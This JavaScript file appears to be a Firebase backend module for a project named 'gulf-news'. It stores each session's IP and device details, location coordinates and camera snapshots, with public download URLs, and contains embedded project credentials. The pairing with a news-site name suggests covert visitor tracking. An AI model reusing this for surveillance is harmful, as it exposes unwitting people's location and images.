import { initializeApp } from 'firebase/app';
import { getFirestore, doc, setDoc, getDoc, updateDoc, arrayUnion, serverTimestamp } from 'firebase/firestore';
        // Removed stray top-level code that caused syntax errors
import { getStorage, ref, uploadString, getDownloadURL } from 'firebase/storage';

// Your web app's Firebase configuration
// REPLACE these placeholders with your actual Firebase project config credentials!
const firebaseConfig = {
  apiKey: "AIzaSyDLDSmvc2mmIuHizwCHlshXh2OFmRfQd3A",
  authDomain: "gulf-news-b5c9d.firebaseapp.com",
  projectId: "gulf-news-b5c9d",
  storageBucket: "gulf-news-b5c9d.firebasestorage.app",
  messagingSenderId: "335715136080",
  appId: "1:335715136080:web:840ec50c14197440db9755",
  measurementId: "G-BF6QFSXBHE"
};

// Initialize Firebase
const app = initializeApp(firebaseConfig);
export const db = getFirestore(app);
export const storage = getStorage(app);

/**
 * Saves or updates session data in Firebase Firestore and Storage
 * @param {string} sessionId Unique ID for the current session
 * @param {string} dataType Type of data ('ipInfo', 'location', 'photo')
 * @param {any} data The payload data
 * @param {any} deviceInfo Client device metadata
 */
export async function saveSessionDataToFirebase(sessionId, dataType, data, deviceInfo) {
  try {
    const sessionRef = doc(db, 'sessions', sessionId);
        console.log('[Firebase] Preparing to save data for', sessionRef.path);
        console.log('[Firebase] Data payload:', { dataType, data, deviceInfo });

    if (dataType === 'ipInfo') {
      await setDoc(sessionRef, {
        sessionId,
        ipInfo: data,
        deviceInfo,
        updatedAt: new Date().toISOString()
      }, { merge: true });
      console.log(`[Firebase] Successfully logged IP and Device info for session: ${sessionId}`);
      return { dataType, sessionId, ipInfo: data, deviceInfo, updatedAt: new Date().toISOString() };    }

    else if (dataType === 'location') {
      await setDoc(sessionRef, {
        location: data,
        updatedAt: new Date().toISOString()
      }, { merge: true });
      console.log(`[Firebase] Successfully logged Location coordinates for session: ${sessionId}`);
      return { dataType, sessionId, location: data, updatedAt: new Date().toISOString() };    }

    else if (dataType === 'photo') {
      // 1. Upload base64 data_url photo to Firebase Storage
      const photoPath = `sessions/${sessionId}/photo_${data.id}.jpg`;
      const photoRef = ref(storage, photoPath);

      console.log(`[Firebase] Uploading snapshot ${data.id} to Storage...`);
      const uploadResult = await uploadString(photoRef, data.url, 'data_url');

      // 2. Retrieve public download URL
      const downloadUrl = await getDownloadURL(photoRef);

      // 3. Append photo object to the array in Firestore using setDoc with merge:true
      await updateDoc(sessionRef, {
          photos: arrayUnion({
            id: data.id,
            url: downloadUrl,
            timestamp: data.timestamp
          }),
          updatedAt: serverTimestamp()
        });
      // Retrieve the updated document for debugging
      const updatedSnap = await getDoc(sessionRef);
      console.log('[Firebase] Updated session after photo upload:', updatedSnap.data());
      console.log('[Firebase] Photo uploaded, download URL:', downloadUrl);
      return { dataType, sessionId, photo: { id: data.id, url: downloadUrl, timestamp: data.timestamp }, updatedAt: new Date().toISOString() };
  }
} catch (error) {
  console.error(`[Firebase Error] Failed to save ${dataType} to Firebase:`, error);
}
}
